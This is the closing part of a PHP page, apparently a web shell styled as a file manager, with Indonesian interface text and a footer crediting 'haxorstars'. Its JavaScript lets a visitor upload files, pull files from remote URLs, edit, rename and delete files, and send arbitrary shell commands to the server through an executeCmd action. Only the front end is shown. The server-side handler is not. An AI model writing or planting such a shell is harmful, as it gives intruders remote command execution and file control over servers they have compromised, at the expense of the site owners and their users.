                    paginationHtml += `<button style="background: var(--td-hover);">${i}</button> `;
                } else {
                    paginationHtml += `<button onclick="changePage(${i})">${i}</button> `;
                }
            }

            if (current_page < total_pages) {
                paginationHtml += `<button onclick="changePage(${current_page + 1})">Next</button>`;
            }

            paginationHtml += '</div>';
            document.getElementById('pagination').innerHTML = paginationHtml;
        }

        function changePage(page) {
            currentPage = page;
            loadFiles();
        }

        function navigateTo(path) {
            currentPath = path;
            currentPage = 1;
            loadFiles();
        }

        function uploadFile() {
            const fileInput = document.getElementById('uploadFile');
            const file = fileInput.files[0];
            if (!file) return;
            const formData = new FormData();
            formData.append('action', 'upload');
            formData.append('path', currentPath);
            formData.append('file', file);
            fetch('', { method: 'POST', body: formData })
                .then(r => r.json())
                .then(response => {
                    if (response.status === 'success') {
                        showNotification('File berhasil diupload');
                        fileInput.value = '';
                        loadFiles();
                    } else {
                        showNotification(response.message || 'Gagal upload file', 'error');
                    }
                })
                .catch(err => showNotification('Error: ' + err, 'error'));
        }

        function remoteUpload() {
            const url = document.getElementById('remoteUrl').value.trim();
            if (!url) {
                showNotification('Mohon Masukan URL dengan benar', 'error')
                return;
            }

            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `action=remote_upload&path=${encodeURIComponent(currentPath)}&url=${encodeURIComponent(url)}`
            })
                .then(r => r.json())
                .then(response => {
                    if (response.status === 'success') {
                        showNotification('Berhasil Mengupload File Melalui URL');
                        document.getElementById('remoteUrl').value = '';
                        loadFiles();
                    } else {
                        showNotification(response.message || 'Gagal mengupload file', 'error');
                    }
                })
                .catch(err => showNotification('Error: ' + err, 'error'));
        }

        function createFolder() {
            const name = document.getElementById('newFolder').value.trim();
            if (!name) return;
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `action=create_folder&path=${encodeURIComponent(currentPath)}&folder_name=${encodeURIComponent(name)}`
            })
                .then(r => r.json())
                .then(response => {
                    if (response.status === 'success') {
                        showNotification('Folder Baru Berhasil Dibuat');
                        document.getElementById('newFolder').value = '';
                        loadFiles();
                    } else {
                        showNotification(response.message || 'Gagal Membuat Folder Baru', 'error');
                    }
                })
                .catch(err => showNotification('Error: ' + err, 'err'));
        }

        function createFile() {
            const name = document.getElementById('newFile').value.trim();
            if (!name) return;
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `action=create_file&path=${encodeURIComponent(currentPath)}&filename=${encodeURIComponent(name)}`
            })
                .then(r => r.json())
                .then(response => {
                    if (response.status === 'success') {
                        showNotification('File Baru Berhasil Dibuat');
                        document.getElementById('newFile').value = '';
                        loadFiles();
                        editFile(name);
                    } else {
                        showNotification(response.message || 'Gagal Membuat File Baru', 'error');
                    }
                })
                .catch(err => showNotification('Error' + err, 'error'));
        }

        function editFile(name) {
            editingFile = currentPath + name;
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `action=read_file&path=${encodeURIComponent(editingFile)}`
            })
                .then(r => r.json())
                .then(data => {
                    if (data.status === 'success') {
                        document.getElementById('fileContent').value = data.content;
                        document.getElementById('editModal').style.display = 'block';
                    }
                });
        }

        function saveFile() {
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `action=save_file&path=${encodeURIComponent(editingFile)}&content=${encodeURIComponent(document.getElementById('fileContent').value)}`
            })
                .then(r => r.json())
                .then(response => {
                    if (response.status === 'success') {
                        showNotification('File berhasil disimpan');
                        loadFiles();
                    } else {
                        showNotification(response.message || 'Gagal menyimpan file', 'error');
                    }
                })
                .catch(err => showNotification('Error: ' + err, 'error'));
        }

        //trigger ctrl + s for save file
        document.addEventListener('keydown', function (e) {
            const editModal = document.getElementById('editModal');
            if (editModal.style.display === 'block') {
                if ((e.ctrlKey || e.metaKey) && e.key === 's') {
                    e.preventDefault();
                    saveFile();
                }
            }
        });

        //trigger close modal with esc / ctrl x
        document.addEventListener('keydown', function (e) {
            const editModal = document.getElementById('editModal');
            if (editModal.style.display === 'block') {
                if ((e.ctrlKey || e.metaKey) && e.key === 's') {
                    e.preventDefault();
                    saveFile();
                }

                if (e.key === 'Escape') {
                    e.preventDefault();
                    closeModal();
                }

                if (e.ctrlKey && e.key === 'x') {
                    e.preventDefault();
                    closeModal();
                }
            }
        });

        function closeModal() {
            document.getElementById('editModal').style.display = 'none';
            document.getElementById('fileContent').value = '';
            editingFile = '';
        }

        function renameItem(name) {
            const newName = prompt('Masukkan nama baru:', name);
            if (!newName || newName === name) return;
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `action=rename&old_path=${encodeURIComponent(currentPath + name)}&new_path=${encodeURIComponent(currentPath + newName)}`
            })
                .then(r => r.json())
                .then(response => {
                    if (response.status === 'success') {
                        showNotification("Rename Berhasil");
                        loadFiles()
                    } else {
                        showNotification(response.message || 'Rename Gagal', 'error');
                    }
                })
                .catch(err => showNotification('Error :' + err, 'error'))
        }

        function deleteItem(name) {
            if (!confirm('Hapus ' + name + '?')) return;
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `action=delete&path=${encodeURIComponent(currentPath + name)}`
            })
                .then(r => r.json())
                .then(response => {
                    if (response.status === 'success') {
                        showNotification('Berhasil Menghapus');
                        loadFiles()
                    } else {
                        showNotification(response.message || 'Gagal Menhapus', 'error')
                    }
                })
                .catch(err => showNotification('Error :' + err, 'error'))
        }

        function executeCmd() {
            const cmd = document.getElementById('cmdInput').value.trim();
            if (!cmd) return;

            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `action=execute&cmd=${encodeURIComponent(cmd)}&current_path=${encodeURIComponent(currentPath)}`
            })
                .then(r => r.json())
                .then(response => {
                    if (response.status === 'success') {
                        document.getElementById('cmdOutput').value = response.output;
                    } else {
                        document.getElementById('cmdOutput').value = response.message || 'Error executing command';
                    }
                })
                .catch(err => {
                    document.getElementById('cmdOutput').value = 'Error: ' + err;
                });
        }

        //trigger enter cmd input
        document.addEventListener('DOMContentLoaded', function () {
            document.getElementById('cmdInput').addEventListener('keypress', function (e) {
                if (e.key === 'Enter') {
                    executeCmd();
                }
            });
        });

        loadFiles();
    </script>
    <div class="footer">
        <?= $fm_name ?> <?= $fm_version ?> &copy; <?= date('Y') ?> - <a href="https://github.com/haxorstars"
            target="_blank"><strong>NuLz</strong></a>
    </div>
</body>

</html>